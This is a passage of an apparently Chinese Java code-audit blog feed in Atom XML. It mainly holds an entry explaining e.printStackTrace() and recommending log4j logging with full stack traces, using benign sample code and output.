src="https://ae01.alicdn.com/kf/H3ccd8617113b4a349c96030085c23212T.png" style="zoom:30%"></center></font></font></li></ul><p><font face="微软雅黑"><center>图2：正确代码</center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-敏感信息硬编码在程序中&quot;&gt;1、敏感信息硬编码在程序中&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-审计方法&quot;&gt;1.2、审计方法：
      
    
    </summary>
    
    
      <category term="JAVA" scheme="http://www.vkxss.top/categories/JAVA/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>e.printStackTrace</title>
    <link href="http://www.vkxss.top/2019/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-e.printStackTrace()%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.vkxss.top/2019/08/21/代码审计-e.printStackTrace()的使用/</id>
    <published>2019-08-21T07:23:43.000Z</published>
    <updated>2019-11-21T09:54:37.659Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#一-eprintstacktrace">一 、e.printStackTrace()</a><ul><li><a href="#1-eprintstacktrace打印在哪里">1、e.printStackTrace()打印在哪里</a></li><li><a href="#2-eprintstacktrace打印的内容是什么">2、e.printStackTrace()打印的内容是什么</a></li><li><a href="#3-如果将eprintstacktrace的信息打印在日志里应该怎么做呢">3、如果将e.printStackTrace()的信息打印在日志里应该怎么做呢？</a></li></ul><ul><li><a href="#22-修复方案">2.2、修复方案：</a></li></ul></li></ul><!-- tocstop --><h3><span id="一-eprintstacktrace">一 、e.printStackTrace()</span></h3><ul><li>e.printStackTrace()打印在哪里以及如何e.printStackTrace()的内容打印在日志中</li></ul><h4><span id="1-eprintstacktrace打印在哪里">1、e.printStackTrace()打印在哪里</span></h4><ul><li>在catch中的e.printStackTrace()将打印到控制台</li></ul><h4><span id="2-eprintstacktrace打印的内容是什么">2、e.printStackTrace()打印的内容是什么</span></h4><ul><li>如下代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class ExceptionTest &#123;</span><br><span class="line">    private static final Logger logger=LogManager.getLogger(); </span><br><span class="line">    public void  test() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            int i=1/0;</span><br><span class="line">            </span><br><span class="line">        &#125;catch(Exception e)&#123;    </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExceptionTest test= new ExceptionTest();</span><br><span class="line">        test.test();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>输出结果如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ArithmeticException: / by zero</span><br><span class="line">    at myProject.ExceptionTest.test(ExceptionTest.java:10)</span><br><span class="line">    at myProject.ExceptionTest.main(ExceptionTest.java:18)</span><br><span class="line">可见，e.printStackTrace()打印了错误的具体信息，即这个错误出现的位置，便于查找错误源</span><br></pre></td></tr></table></figure><h4><span id="3-如果将eprintstacktrace的信息打印在日志里应该怎么做呢">3、如果将e.printStackTrace()的信息打印在日志里应该怎么做呢？</span></h4><ul><li>见如下代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package myProject;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class ExceptionTest &#123;</span><br><span class="line">    private static final Logger logger=LogManager.getLogger(); </span><br><span class="line">    public void  test() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            int i=1/0;</span><br><span class="line">            </span><br><span class="line">        &#125;catch(Exception e)&#123;    </span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExceptionTest test= new ExceptionTest();</span><br><span class="line">        test.test();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>复制代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用logger.error(e);打印日志，输出结果如下：</span><br><span class="line"></span><br><span class="line">19:17:39.753 [main] ERROR myProject.ExceptionTest - java.lang.ArithmeticException: / by zero</span><br><span class="line">可见，用这种方法打印的日志，只有大概的错误信息，并没有指出报错的代码位置，不便于查找错误。用logger.error(e.getMessage());也是输出这种大概的错误信息。</span><br></pre></td></tr></table></figure><ul><li>再见如下代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package myProject;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class ExceptionTest &#123;</span><br><span class="line">    private static final Logger logger=LogManager.getLogger(); </span><br><span class="line">    public void  test() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            int i=1/0;</span><br><span class="line">            </span><br><span class="line">        &#125;catch(Exception e)&#123;    </span><br><span class="line">            logger.error(&quot;ExceptionTest Exception:&quot;,e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ExceptionTest test= new ExceptionTest();</span><br><span class="line">        test.test();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>复制代码<br>用logger.error(“ExceptionTest Exception:”,e);，则输出结果如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">19:20:32.948 [main] ERROR myProject.ExceptionTest - ExceptionTest Exception:</span><br><span class="line">java.lang.ArithmeticException: / by zero</span><br><span class="line">    at myProject.ExceptionTest.test(ExceptionTest.java:10) [classes/:?]</span><br><span class="line">    at myProject.ExceptionTest.main(ExceptionTest.java:18) [classes/:?]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">这和e.printStackTrace()打印的内容大致是相同的。</span><br></pre></td></tr></table></figure><h2><span id="22-修复方案">2.2、修复方案：</span></h2><ul><li>java中e.printStackTrace()不要使用，请使用logger记录</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一-eprintstacktrace&quot;&gt;一 、e.printStackTrace()&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-eprintstacktrace打印在哪里&quot;&gt;1、e.printStackTra
      
    
    </summary>
    
    
      <category term="JAVA" scheme="http://www.vkxss.top/categories/JAVA/"/>
    
    
      <category term="Java代码审计" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
